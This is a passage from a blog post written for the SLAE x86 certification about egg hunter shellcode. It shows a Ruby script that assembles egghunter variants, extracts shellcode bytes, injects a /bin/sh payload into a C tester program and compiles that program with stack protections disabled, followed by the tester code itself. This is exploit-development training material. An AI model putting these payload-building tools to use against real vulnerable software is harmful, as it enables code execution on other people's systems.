</span></span><span class=line><span class=cl>  <span class=sb>`nasm -f elf32 -o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.nasm`</span>
</span></span><span class=line><span class=cl>  <span class=sb>`ld -m elf_i386 -s -o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb> </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.o`</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Generate shellcode using objdump</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_shellcode</span>
</span></span><span class=line><span class=cl>  <span class=n>objdump</span> <span class=o>=</span> <span class=sb>`objdump -d </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>`</span>
</span></span><span class=line><span class=cl>  <span class=n>objdump</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>map</span> <span class=p>{</span> <span class=o>|</span><span class=n>line</span><span class=o>|</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>[</span><span class=mi>1</span><span class=o>]</span> <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=o>.</span><span class=n>compact</span><span class=o>.</span><span class=n>map</span><span class=p>(</span><span class=o>&amp;</span><span class=ss>:split</span><span class=p>)</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>prepend</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Replace a value inside a file</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>replace_content</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=n>file_content</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>yield</span><span class=p>(</span><span class=n>file_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=no>File</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>file_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Replace shellcode in the shellcode tester program</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>replace_shellcode</span>
</span></span><span class=line><span class=cl>  <span class=n>replace_content</span><span class=p>(</span><span class=s1>&#39;./shellcode.c&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>c_code</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=n>egg</span> <span class=o>=</span> <span class=vi>@egghunter</span> <span class=o>==</span> <span class=mi>3</span> <span class=o>?</span> <span class=s1>&#39;JSNVJSNV&#39;</span> <span class=p>:</span> <span class=s1>&#39;\x90\x50\x90\x50&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>egg</span> <span class=o>+</span> <span class=p>(</span><span class=vi>@payload</span> <span class=o>||</span> <span class=no>PAYLOAD</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c_code</span><span class=o>.</span><span class=n>gsub!</span><span class=p>(</span><span class=sr>/egghunter\[\] = \&#34;\S+\&#34;\;/</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                 <span class=s2>&#34;egghunter[] = </span><span class=se>\&#34;</span><span class=si>#{</span><span class=vi>@egghunter_shellcode</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>\;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>c_code</span><span class=o>.</span><span class=n>gsub!</span><span class=p>(</span><span class=sr>/egg\[\] = \&#34;\S+\&#34;\;/</span><span class=p>,</span> <span class=s2>&#34;egg[] = </span><span class=se>\&#34;</span><span class=si>#{</span><span class=n>payload</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>\;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Compile the shellcode into binary with the help of the shellcode.c program</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>compile_binary</span>
</span></span><span class=line><span class=cl>  <span class=sb>`gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2&gt; /dev/null`</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_args</span>
</span></span><span class=line><span class=cl>  <span class=vi>@parser</span> <span class=o>=</span> <span class=no>OptionParser</span><span class=o>.</span><span class=n>new</span> <span class=k>do</span> <span class=o>|</span><span class=n>opts</span><span class=o>|</span>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>banner</span> <span class=o>=</span> <span class=s2>&#34;Usage: </span><span class=si>#{</span><span class=vg>$0</span><span class=si>}</span><span class=s2> [options]&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;Options:&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--egghunter&#34;</span><span class=p>,</span> <span class=s2>&#34;-e EGGHUNTER_NUMBER&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;</span><span class=se>\n\t\t</span><span class=s2>Pick which egghunter to use:</span><span class=se>\n\t\t</span><span class=s2>1: access(2)</span><span class=se>\n\t\t</span><span class=s2>2: &#34;</span><span class=p>\</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;access(2) revisited</span><span class=se>\n\t\t</span><span class=s2>3: sigaction(2)</span><span class=se>\n\t\t</span><span class=s2>4: modified&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
</span></span><span class=line><span class=cl>              <span class=vi>@egghunter</span> <span class=o>=</span> <span class=n>value</span><span class=o>.</span><span class=n>to_i</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--payload&#34;</span><span class=p>,</span> <span class=s2>&#34;-p SHELLCODE_PAYLOAD&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;Payload to be added. Default: &#39;/bin/sh&#39;&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
</span></span><span class=line><span class=cl>              <span class=vi>@payload</span> <span class=o>=</span> <span class=n>value</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>opts</span><span class=o>.</span><span class=n>on_tail</span><span class=p>(</span><span class=s2>&#34;--help&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>,</span> <span class=s2>&#34;Print options&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>show_help</span><span class=o>|</span>
</span></span><span class=line><span class=cl>      <span class=nb>warn</span> <span class=n>opts</span>
</span></span><span class=line><span class=cl>      <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>end</span>
</span></span><span class=line><span class=cl>  <span class=k>end</span>
</span></span><span class=line><span class=cl>  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse!</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=bp>__FILE__</span> <span class=o>==</span> <span class=vg>$PROGRAM_NAME</span>
</span></span><span class=line><span class=cl>  <span class=n>run</span>
</span></span><span class=line><span class=cl>  <span class=nb>puts</span> <span class=s2>&#34;Successfully generated </span><span class=se>\e</span><span class=s2>[32mshellcode</span><span class=se>\e</span><span class=s2>[0m binary!&#34;</span>
</span></span><span class=line><span class=cl><span class=k>end</span>
</span></span></code></pre></td></tr></table></div></div><p>Also, a shellcode tester C program below is needed to test this setup since the main shellcode with the egg is stored somewhere in the memory while the program executes the egghunter:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>egghunter</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;&lt;egghunger_shellcode&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>egg</span><span class=p>[]</span> <span class=o>=</span> <span class=s>&#34;</span><span class=se>\x90\x50\x90\x50</span><span class=s>&lt;main_shellcode&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Egg hunter shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>egghunter</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Egg shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>strlen</span><span class=p>(</span><span class=n>egg</span><span class=p>));</span>
</span></span><span class=line><span class=cl>	<span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>egghunter</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nf>ret</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=script-usage-and-testing>Script usage and testing</h2><p>Below demo shows the options for the Ruby script then usage of default payload and a sample <code>HelloWorldShellcode-Stack</code> payload from the course material.
<img src=egghunter.gif alt></p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href=http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE - 1558</p><hr><p><a href=https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A3><code>Link to Github repository</code></a> | <a href=../slae_x86><code>Link to index page</code></a></p></div></article><div id=footer-post-container><div id=footer-post><div id=nav-footer style=display:none><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></div><div id=toc-footer style=display:none><nav id=TableOfContents><ul><li><a href=#objectives>Objectives</a></li><li><a href=#overview>Overview</a></li><li><a href=#dissecting-the-shellcode>Dissecting the shellcode</a><ul><li><ul><li><a href=#recall>Recall</a></li></ul></li></ul></li><li><a href=#implementation>Implementation</a></li><li><a href=#dynamic-configuration>Dynamic Configuration</a></li><li><a href=#script-usage-and-testing>Script usage and testing</a></li></ul></nav></div><div id=share-footer style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f" aria-label=Facebook><i class="fab fa-facebook fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&text=SLAE%20x86%20-%20Assignment%200x3" aria-label=Twitter><i class="fab fa-twitter fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=Linkedin><i class="fab fa-linkedin fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x3" aria-label=Pinterest><i class="fab fa-pinterest fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x3&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f" aria-label=Email><i class="fas fa-envelope fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=Pocket><i class="fab fa-get-pocket fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&title=SLAE%20x86%20-%20Assignment%200x3" aria-label=reddit><i class="fab fa-reddit fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&name=SLAE%20x86%20-%20Assignment%200x3&description=%3ch1%20id%3d%22egg-hunter-shellcode%22%3eEgg%20Hunter%20Shellcode%3c%2fh1%3e%0a%3ch2%20id%3d%22objectives%22%3eObjectives%3c%2fh2%3e%0a%3cul%3e%0a%3cli%3eStudy%20about%20egg%20hunter%20shellcode%3c%2fli%3e%0a%3cli%3eCreate%20a%20working%20demo%20of%20the%20egg%20hunter%0a%3cul%3e%0a%3cli%3eShould%20be%20configurable%20of%20different%20payloads%3c%2fli%3e%0a%3c%2ful%3e%0a%3c%2fli%3e%0a%3c%2ful%3e%0a%3ch2%20id%3d%22overview%22%3eOverview%3c%2fh2%3e%0a%3cp%3eEgg%20hunter%20shellcode%20is%20a%20helper%20shellcode%20that%20will%20scan%20the%20memory%20pages%20to%20search%20for%20a%20predefined%20pattern%20called%20%3ccode%3eegg%3c%2fcode%3e.%0aThe%20egg%20is%20appended%20in%20the%20main%20shellcode%20that%20will%20be%20executed%20during%20the%20exploitation.%0aIt%20is%20useful%20when%20there%26rsquo%3bs%20a%20limited%20shellcode%20size%20for%20a%20vulnerable%20application%26rsquo%3bs%20input.%0aThe%20egg%20hunter%20shellcode%20can%20then%20be%20used%20as%20an%20alternative%20since%20it%20is%20small%2c%20but%20the%20main%20shellcode%20should%20be%20put%20in%20other%20inputs%20to%20find%20it%20in%20the%20memory.%0aThis%20%3ca%20href%3d%22http%3a%2f%2fwww.hick.org%2fcode%2fskape%2fpapers%2fegghunt-shellcode.pdf%22%3e%3ccode%3eresearch%20paper%3c%2fcode%3e%3c%2fa%3e%20presented%20several%20implementations%20for%20both%20Linux%20and%20Windows%3c%2fp%3e" aria-label=Tumblr><i class="fab fa-tumblr fa-lg" aria-hidden=true></i></a></li><li><a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a3%2f&t=SLAE%20x86%20-%20Assignment%200x3" aria-label="Hacker News"><i class="fab fa-hacker-news fa-lg" aria-hidden=true></i></a></li></ul></div><div id=actions-footer><a id=menu-toggle class=icon href=# onclick='return $("#nav-footer").toggle(),!1' aria-label=Menu><i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick='return $("#toc-footer").toggle(),!1' aria-label=TOC><i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick='return $("#share-footer").toggle(),!1' aria-label=Share><i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a></div></div></div><footer id=footer><div class=footer-left>Copyright &copy; 2025 jsn>
<a class=icon target=_blank rel=noopener href=https://github.com/jsnv-dev aria-label=github><i class="fab fa-github" aria-hidden=true></i>
</a><a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/jasonvillaluna aria-label=linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></div><div class=footer-right><nav><ul><li><a href=/>~/</a></li><li><a href=/posts>~/posts</a></li><li><a href=/about>~/about</a></li><li><a href=/work>~/work</a></li></ul></nav></div></footer></div></body><link rel=stylesheet href=/lib/font-awesome/css/all.min.css><script src=/lib/jquery/jquery.min.js></script><script src=/js/main.js></script><script src=/js/code-copy.js></script></html>